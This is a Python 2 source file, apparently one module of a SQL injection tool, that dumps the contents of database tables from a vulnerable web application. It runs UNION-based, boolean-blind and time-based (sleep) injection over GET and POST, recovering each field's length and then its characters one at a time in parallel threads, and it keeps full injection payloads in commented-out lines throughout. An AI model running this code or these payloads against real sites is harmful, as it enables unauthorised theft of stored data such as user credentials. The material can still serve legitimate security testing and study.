#!/usr/bin/env python
# -*- coding:utf-8 -*-
from lib.log import logger
from columns import SqliColumns
from config import UnpackFunction
from prettytable import PrettyTable
from tqdm import trange
import threading
import Queue

__author__ = "LoRexxar"


class SqliContent(SqliColumns):
    def __init__(self):
        SqliColumns.__init__(self)

    # 多线程判断跑数据
    def run_content(self):

        if len(self.columns_name) == 0:
            SqliColumns.get_columns(self)

        # 循环解包，进入注入
        for database_name in self.columns_name:
            for table_name in self.columns_name[database_name]:

                # 获取数据的条数，如果小于设置的self.content_count，那需要设置条数等于self.content_count
                content_counts = self.get_content_count(database_name, table_name)
                if content_counts == 0:
                    logger.warning('Database %s Table %s is empty...' % (database_name, table_name))
                    continue
                elif content_counts != self.content_count:
                    logger.debug('Database %s Table %s content amount change to %d' % (database_name, table_name, content_counts))
                    self.content_count = content_counts
                else:
                    pass

                # 声明一个表储存数据
                content = PrettyTable(list(self.columns_name[database_name][table_name]))
                content.padding_width = 1

                # 每个表都要注入指定条数那么多次
                for limits in xrange(self.content_count):

                    # 声明一个队列，储存返回的值
                    result = Queue.Queue()

                    # 声明线程队列、结果队列和最终插入table的数据队列
                    threads = []
                    results = []
                    contents = []

                    # 开始多线程的注入
                    logger.debug("Start multithreading Sqli...")
                    for column_name in self.columns_name[database_name][table_name]:
                        # 开始一个线程注入一个字段
                        try:
                            t = threading.Thread(target=self.get_content, name='thread for %s' % column_name,
                                                 args=(result, database_name, table_name, column_name, limits))
                            t.start()
                        except ConnectionError:
                            logger.error('Thread error...')
                            pass

                        threads.append(t)

                    # 等待所有线程结束
                    for t in threads:
                        t.join()

                    # 注入处理返回数据，插入content中的一条
                    while not result.empty():
                        results.append(result.get())

                    # 处理返回的数据
                    for i in list(self.columns_name[database_name][table_name]):
                        for item in results:
                            if item[0] == i:
                                contents.append(item[1])
                            else:
                                continue

                    # 插入数据
                    content_str = ','.join(contents)
                    logger.info("Sqli success content is %s" % content_str)
                    content.add_row(contents)

                # 输出表
                logger.debug("Database %s Table %s sqli success..." % (database_name, table_name))
                print "[*] Database %s Table %s content:" % (database_name, table_name)
                print content

    # 获取内容
    def get_content(self, result, database_name, table_name, column_name, limits):

        # 开始注内容
        content_len = 0
        logger.debug("Start sqli table %s column %s limit %d content..." % (table_name, column_name, limits))

        # 先GET
        if self.sqlirequest == "GET":
            logger.debug("The sqlirequest is %s, start sqli content..." % self.sqlirequest)

            if self.sqlimethod == "normal":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)

                # 注这一条的数据长度
                logger.debug("Start %dth content length sqli..." % (limits + 1))
                # payload = "user=ddog' union all SELECT 1,length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
                #     limits) + ",1%23&passwd=ddog123&submit=Log+In"
                payload = self.dealpayload.construct_normal_payload(select="length(" + column_name + ")",
                                                                    source=database_name + "." + table_name,
                                                                    limit=limits)
                r = self.Data.GetData(payload)
                content_len = int(UnpackFunction(r))
                logger.debug("Content length sqli success...now is limit %d, The content_len is %d..." % (limits, content_len))
                logger.info("[*] content_len: %d" % content_len)

                # 然后注content
                logger.debug("Start %dth content sqli..." % (limits + 1))
                # payload = "user=ddog' union SELECT 1," + column_name + " from " + database_name + "." + table_name + " limit " + repr(
                #     limits) + ",1%23&passwd=ddog123&submit=Log+In"
                payload = self.dealpayload.construct_normal_payload(select=column_name,
                                                                    source=database_name + "." + table_name,
                                                                    limit=limits)
                r = self.Data.GetData(payload)
                content = UnpackFunction(r)
                logger.debug("Content sqli success...The content is %s..." % content)

                # 把content return回去，以元组的形式
                contents = [column_name, content]
                logger.info("[*] content: %s" % content)
                result.put(tuple(contents))

            elif self.sqlimethod == "build":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)

                # 然后注content 的 length
                for j in trange(100, desc="Content sqli...", leave=False, disable=True):
                    logger.debug("Start %dth content length sqli..." % (limits + 1))
                    # payload = "user=user1' %26%26 (select ((SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
                    #     limits) + ",1) > " + repr(j) + "))%23&passwd=ddog123&submit=Log+In"
                    payload = self.dealpayload.construct_build_payload(
                        select="length(" + column_name + ")",
                        source=database_name + "." + table_name,
                        limit=limits,
                        compare=j)
                    if self.Data.GetBuildData(payload, self.len) == 0:
                        content_len = j
                        break
                    elif j == 100:
                        logger.error("Content length > 100...")
                        content_len = 100

                logger.debug("Content length sqli success...now is limit %d, The content_len is %d..." % (limits, content_len))
                logger.info("[*] content_len: %d" % content_len)

                # 然后注content名字
                # 清空column_name
                content = ""
                logger.debug("Start %dth content sqli..." % (limits + 1))
                for j in trange(int(content_len), desc='%dth Content sqli' % (limits + 1), leave=False, disable=True):
                    for k in trange(100, desc='%dth Content\'s %dth char sqli' % ((limits + 1), (j + 1)),
                                    leave=False, disable=True):
                        # payload = "user=user1' %26%26 (select ((SELECT ascii(substring(" + column_name + "," + repr(
                        #     j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
                        #     limits) + ",1) >" + repr(k + 30) + "))%23&passwd=ddog123&submit=Log+In"
                        payload = self.dealpayload.construct_build_payload(select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
                                                                           source=database_name + "." + table_name,
                                                                           limit=limits,
                                                                           compare=(k + 30))
                        if self.Data.GetBuildData(payload, self.len) == 0:
                            content += chr(int(k + 30))
                            break

                logger.debug("Content sqli success...The content is %s..." % content)

                # 把content return回去，以元组的形式
                contents = [column_name, content]
                logger.info("[*] content: %s" % content)
                result.put(tuple(contents))

            elif self.sqlimethod == "time":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)

                # 然后注content 的length
                for j in trange(100, desc="Content sqli...", leave=False, disable=True):
                    logger.debug("Start %dth content length sqli..." % (limits + 1))
                    # payload = "user=ddog' union SELECT 1,if((SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
                    #     limits) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
                    payload = self.dealpayload.construct_time_payload(
                        select="length(" + column_name + ")",
                        source=database_name + "." + table_name,
                        limit=limits,
                        compare=j)
                    if self.Data.GetTimeData(payload, self.time) == 0:
                        content_len = j
                        break
                    elif j == 100:
                        logger.error("Content length > 100...")
                        content_len = 100

                logger.debug("Content length sqli success...now is limit %d, The content_len is %d..." % (limits, content_len))
                logger.info("[*] content_len: %d" % content_len)

                # 然后注content名字
                # 清空column_name
                content = ""
                logger.debug("Start %dth content sqli..." % (limits + 1))
                for j in trange(int(content_len), desc='%dth Content sqli' % (limits + 1), leave=False, disable=True):
                    for k in trange(100, desc='%dth Content\'s %dth char sqli' % ((limits + 1), (j + 1)),
                                    leave=False, disable=True):
                        # payload = "user=ddog' union sELECT 1,if((SELECT  ascii(substring(" + column_name + "," + repr(
                        #     j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
                        #     limits) + ",1) > " + repr(
                        #     k + 30) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
                        payload = self.dealpayload.construct_time_payload(
                            select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
                            source=database_name + "." + table_name,
                            limit=limits,
                            compare=(k + 30))
                        if self.Data.GetTimeData(payload, self.time) == 0:
                            content += chr(int(k + 30))
                            break

                logger.debug("Content sqli success...The content is %s..." % content)

                # 把content return回去，以元组的形式
                contents = [column_name, content]
                logger.info("[*] content: %s" % content)
                result.put(tuple(contents))

        # 然后是post
        elif self.sqlirequest == "POST":
            logger.debug("The sqlirequest is %s, start sqli contents..." % self.sqlirequest)

            if self.sqlimethod == "normal":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)

                # 首先是tablename的长度
                # payload = {
                #     "user": "ddog' union all SELECT 1,length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
                #         limits) + ",1#", "passwd": "ddog123&submit=Log+In"}
                payload = self.dealpayload.construct_normal_payload(select="length(" + column_name + ")",
                                                                    source=database_name + "." + table_name,
                                                                    limit=limits)
                r = self.Data.PostData(payload)
                content_len = int(UnpackFunction(r))
                logger.debug(
                    "Content length sqli success...now is limit %d, The content_len is %d..." % (limits, content_len))
                logger.info("[*] content_len: %d" % content_len)

                # 然后注content
                # payload = {
                #     "user": "ddog' union all SELECT 1," + column_name + " from " + database_name + "." + table_name + " limit " + repr(
                #         limits) + ",1#", "passwd": "ddog123"}
                payload = self.dealpayload.construct_normal_payload(select=column_name,
                                                                    source=database_name + "." + table_name,
                                                                    limit=limits)
                r = self.Data.PostData(payload)
                content = UnpackFunction(r)
                logger.debug("Content sqli success...The content is %s..." % content)

                # 把content return回去，以元组的形式
                contents = [column_name, content]
                logger.info("[*] content: %s" % content)
                result.put(tuple(contents))

            elif self.sqlimethod == "build":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)

                # 然后注content 的length
                for j in trange(100, desc="Content sqli...", leave=False, disable=True):
                    logger.debug("Start %dth content length sqli..." % (limits + 1))
                    # payload = {
                    #     "user": "user1' && (select ((SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
                    #         limits) + ",1) > " + repr(j) + "))#", "passwd": "ddog123"}
                    payload = self.dealpayload.construct_build_payload(
                        select="length(" + column_name + ")",
                        source=database_name + "." + table_name,
                        limit=limits,
                        compare=j)
                    if self.Data.PostBuildData(payload, self.len) == 0:
                        content_len = j
                        break
                    elif j == 100:
                        logger.error("Content length > 100...")
                        content_len = 100

                logger.debug(
                    "Content length sqli success...now is limit %d, The content_len is %d..." % (limits, content_len))
                logger.info("[*] content_len: %d" % content_len)

                # 然后注content名字
                # 清空column_name
                content = ""
                logger.debug("Start %dth content sqli..." % (limits + 1))
                for j in trange(int(content_len), desc='%dth Content sqli' % (limits + 1), leave=False, disable=True):
                    for k in trange(100, desc='%dth Content\'s %dth char sqli' % ((limits + 1), (j + 1)),
                                    leave=False, disable=True):
                        # payload = {"user": "user1' && (select ((SELECT ascii(substring(" + column_name + "," + repr(
                        #     j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
                        #     limits) + ",1) >" + repr(k + 30) + "))#", "passwd": "ddog123"}
                        payload = self.dealpayload.construct_build_payload(
                            select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
                            source=database_name + "." + table_name,
                            limit=limits,
                            compare=(k + 30))
                        if self.Data.PostBuildData(payload, self.len) == 0:
                            content += chr(int(k + 30))
                            break

                logger.debug("Content sqli success...The content is %s..." % content)

                # 把content return回去，以元组的形式
                contents = [column_name, content]
                logger.info("[*] content: %s" % content)
                result.put(tuple(contents))

            elif self.sqlimethod == "time":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)

                # 然后注content 的length
                for j in trange(100, desc="Content sqli...", leave=False, disable=True):
                    logger.debug("Start %dth content length sqli..." % (limits + 1))
                    # payload = {
                    #     "user": "ddog' union SELECT 1,if((SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
                    #         limits) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
                    payload = self.dealpayload.construct_time_payload(
                        select="length(" + column_name + ")",
                        source=database_name + "." + table_name,
                        limit=limits,
                        compare=j)
                    if self.Data.PostTimeData(payload, self.time) == 0:
                        content_len = j
                        break
                    elif j == 100:
                        logger.error("Content length > 100...")
                        content_len = 100

                logger.debug(
                    "Content length sqli success...now is limit %d, The content_len is %d..." % (limits, content_len))
                logger.info("[*] content_len: %d" % content_len)

                # 然后注content名字
                # 清空column_name
                content = ""
                logger.debug("Start %dth content sqli..." % (limits + 1))
                for j in trange(int(content_len), desc='%dth Content sqli' % (limits + 1), leave=False, disable=True):
                    for k in trange(100, desc='%dth Content\'s %dth char sqli' % ((limits + 1), (j + 1)),
                                    leave=False, disable=True):
                        # payload = {
                        #     "user": "ddog' union SELECT 1,if((SELECT  ascii(substring(" + column_name + "," + repr(
                        #         j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
                        #         limits) + ",1) > " + repr(k) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
                        payload = self.dealpayload.construct_time_payload(
                            select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
                            source=database_name + "." + table_name,
                            limit=limits,
                            compare=(k + 30))
                        if self.Data.PostTimeData(payload, self.time) == 0:
                            content += chr(int(k))
                            break

                logger.debug("Content sqli success...The content is %s..." % content)

                # 把content return回去，以元组的形式
                contents = [column_name, content]
                logger.info("[*] content: %s" % content)
                result.put(tuple(contents))

        logger.debug("Sqli table %s column %s limit %d success..." % (table_name, column_name, limits))

    # 获取数据条数
    def get_content_count(self, database_name, table_name):

        # 开始注内容
        logger.debug("Start sqli table %s content amount..." % table_name)

        # 先GET
        if self.sqlirequest == "GET":
            logger.debug("The sqlirequest is %s, start sqli content..." % self.sqlirequest)

            if self.sqlimethod == "normal":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start table's %s content amount sqli..." % table_name)

                # 注数据的数量
                # payload = "user=ddog' union SELECT 1,count(*) from " + database_name + "." + table_name + " %23&passwd=ddog123&submit=Log+In"
                payload = self.dealpayload.construct_normal_payload(select="count(*)",
                                                                    source=database_name + "." + table_name)
                r = self.Data.GetData(payload)
                content_count = int(UnpackFunction(r))
                logger.debug("Content account sqli success...The count is %d..." % content_count)

                # 把content account return回去
                logger.info("[*] content count: %d" % content_count)
                return content_count

            elif self.sqlimethod == "build":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start table's %s content amount sqli..." % table_name)

                for i in trange(100, desc='Content amount sqli', leave=False, disable=True):
                    # 先注content的数量
                    # payload = "user=user1' %26%26 (select ((SELECT count(*) from " + database_name + "." + table_name + ") > " + repr(i) + "))%23&passwd=ddog123&submit=Log+In"
                    payload = self.dealpayload.construct_build_payload(
                        select="count(*)",
                        source=database_name + "." + table_name,
                        compare=i)
                    if self.Data.GetBuildData(payload, self.len) == 0:
                        content_count = i
                        break
                    elif i == 100:
                        logger.error("Content amount > 100...")
                        content_count = 100

                logger.debug("Content account sqli success...The content_count is %d..." % content_count)
                logger.info("[*] content_count: %d" % content_count)

                # 把content account return回去
                logger.info("[*] content count: %d" % content_count)
                return content_count

            elif self.sqlimethod == "time":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)

                logger.debug("Start table's %s content amount sqli..." % table_name)

                for i in trange(100, desc='Content amount sqli', leave=False, disable=True):
                    # 先注content的数量
                    # payload = "user=ddog' union SELECT 1,if((SELECT count(*) from " + database_name + "." + table_name + ") > " + repr(i) + ",sleep(" + repr(
                    #     self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
                    payload = self.dealpayload.construct_time_payload(
                        select="count(*)",
                        source=database_name + "." + table_name,
                        compare=i)
                    if self.Data.GetTimeData(payload, self.time) == 0:
                        content_count = i
                        break
                    elif i == 100:
                        logger.error("Content amount > 100...")
                        content_count = 100

                logger.debug("Content account sqli success...The content_count is %d..." % content_count)
                logger.info("[*] content_count: %d" % content_count)

                # 把content account return回去
                logger.info("[*] content count: %d" % content_count)
                return content_count

        # 然后是post
        elif self.sqlirequest == "POST":
            logger.debug("The sqlirequest is %s, start sqli contents..." % self.sqlirequest)

            if self.sqlimethod == "normal":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start table's %s content amount sqli..." % table_name)

                # 注数据的数量
                payload = self.dealpayload.construct_normal_payload(select="count(*)",
                                                                    source=database_name + "." + table_name)
                r = self.Data.PostData(payload)
                content_count = int(UnpackFunction(r))
                logger.debug("Content account sqli success...The count is %d..." % content_count)

                # 把content account return回去
                logger.info("[*] content count: %d" % content_count)
                return content_count

            elif self.sqlimethod == "build":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start table's %s content amount sqli..." % table_name)

                for i in trange(100, desc='Content amount sqli', leave=False, disable=True):
                    # 先注content的数量
                    # payload = {
                    #     "user": "user1' && (select ((SELECT count(*) from " + database_name + "." + table_name + ") > " + repr(i) + "))#", "passwd": "ddog123"}
                    payload = self.dealpayload.construct_build_payload(
                        select="count(*)",
                        source=database_name + "." + table_name,
                        compare=i)
                    if self.Data.PostBuildData(payload, self.len) == 0:
                        content_count = i
                        break
                    elif i == 100:
                        logger.error("Content amount > 100...")
                        content_count = 100

                logger.debug("Content account sqli success...The content_count is %d..." % content_count)
                logger.info("[*] content_count: %d" % content_count)

                # 把content account return回去
                logger.info("[*] content count: %d" % content_count)
                return content_count

            elif self.sqlimethod == "time":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)

                logger.debug("Start table's %s content amount sqli..." % table_name)

                for i in trange(100, desc='Content amount sqli', leave=False, disable=True):
                    # 先注content的数量
                    # payload = {
                    #     "user": "ddog' union SELECT 1,if((SELECT count(*) from " + database_name + "." + table_name + ") > " + repr(i) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
                    payload = self.dealpayload.construct_time_payload(
                        select="count(*)",
                        source=database_name + "." + table_name,
                        compare=i)
                    if self.Data.PostTimeData(payload, self.time) == 0:
                        content_count = i
                        break
                    elif i == 100:
                        logger.error("Content amount > 100...")
                        content_count = 100

                logger.debug("Content account sqli success...The content_count is %d..." % content_count)
                logger.info("[*] content_count: %d" % content_count)

                # 把content account return回去
                logger.info("[*] content count: %d" % content_count)
                return content_count


